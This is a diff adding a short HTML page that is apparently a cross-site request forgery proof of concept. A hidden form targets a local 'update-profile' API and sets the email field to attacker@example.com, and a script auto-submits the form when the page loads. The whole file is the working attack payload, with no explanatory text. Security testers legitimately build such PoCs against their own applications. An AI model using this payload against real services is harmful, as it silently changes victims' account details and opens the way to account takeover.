@@ -1,0 +1,11 @@
+<html>
+  <body>
+    <form action="http://127.0.0.1:5000/api/v1/update-profile" method="POST" id="csrf-form">
+      <input type="hidden" name="email" value="attacker@example.com">
+      <input type="hidden" name="phone" value="1234567890">
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
